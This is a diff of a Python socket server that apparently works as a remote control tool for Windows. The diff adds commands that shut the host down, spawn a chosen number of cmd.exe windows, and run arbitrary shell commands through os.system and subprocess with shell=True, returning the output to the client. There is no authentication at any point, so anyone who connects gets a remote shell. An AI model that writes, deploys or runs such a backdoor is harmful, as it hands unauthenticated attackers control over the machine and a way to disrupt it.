@@ -1,5 +1,6 @@
 import socket
 import subprocess
+import os
 
 def get_local_ip():
     """Get the local IP address of the machine."""
@@ -19,45 +20,57 @@ def start_server(port=65432):
         server_socket.bind((host, port))
         print(f"Server started on {host}:{port}")
         
-        server_socket.listen(1)
+        server_socket.listen(1)  # Listen for one connection at a time
         
         while True:
             print("Waiting for a new connection...")
-
+            
             # Accept the client connection
             conn, addr = server_socket.accept()
+            print(f"Connected by {addr}")
+            
             with conn:
-                print(f"Connected by {addr}")
-                
                 while True:
-                    # Receive message from the client
-                    data = conn.recv(1024)  # Buffer size of 1024 bytes
-                    if not data:
-                        # If no data is received, connection is closed by the client
-                        print(f"Client {addr} disconnected.")
-                        break  # Break the inner loop to accept new connections
+                    try:
+                        # Receive message from the client
+                        data = conn.recv(1024)  # Buffer size of 1024 bytes
+                        if not data:
+                            # Client has disconnected
+                            print(f"Client {addr} disconnected.")
+                            break  # Break the inner loop to accept new connections
+                        
+                        # Process the message from the client
+                        message = data.decode('utf-8')
+                        splitUp = message.split(":")
+                        
+                        if splitUp[0].lower() == "shutdown":
+                            print("Shutting down the system...")
+                            os.system("shutdown /s")  # Shutdown command (Windows)
+                            response = "System is shutting down..."
+                            conn.sendall(response.encode('utf-8'))
+                        
+                        elif splitUp[0].lower() == "crash":
+                            crash_count = int(splitUp[1]) if len(splitUp) > 1 and splitUp[1].isdigit() else 10
+                            for _ in range(crash_count):
+                                os.system("start cmd.exe")  # Open multiple CMD windows (Windows)
+                            response = f"Opened {crash_count} command windows"
+                            conn.sendall(response.encode('utf-8'))
+                        
+                        elif splitUp[0].lower() == "do":
+                            os.system(splitUp[1])  # Execute command (Windows)
+                        elif splitUp[0].lower() == "get":
+                            try:
+                                response = subprocess.check_output(splitUp[1], shell=True)
+                                conn.sendall(response)
+                            except subprocess.CalledProcessError as e:
+                                error_message = f"Command failed: {e}"
+                                conn.sendall(error_message.encode('utf-8'))
                     
-                    # Process the message
-                    message = data.decode('utf-8')
-                    
-                    if message.lower() == "shutdown":
-                        print("Client requested shutdown. Shutting down server...")
-                        return  # Exit the server loop, shutting down the server
-                    
-                    elif message.lower() == "crash":
-                        print("Client requested crash. Crashing server...")
-                        return  # Exit the server loop, crashing the server
-                    else:
-                        try:
-                            # Execute the command received from the client
-                            response = subprocess.check_output(message, shell=True)
-                            # Send the response back to the client (response is already in bytes)
-                            conn.sendall(response)
-                            print(f"Executed command: {message}, response: {response}")
-                        except subprocess.CalledProcessError as e:
-                            error_message = f"Command failed: {e}"
-                            conn.sendall(error_message.encode('utf-8'))
-                            print(error_message)
+                    except Exception as e:
+                        print(f"Error handling client {addr}: {e}")
+                        break  # Break out of the inner loop to listen for new connections
+                        
+            print("Connection closed. Waiting for new connection...")
 
 if __name__ == "__main__":
     start_server()
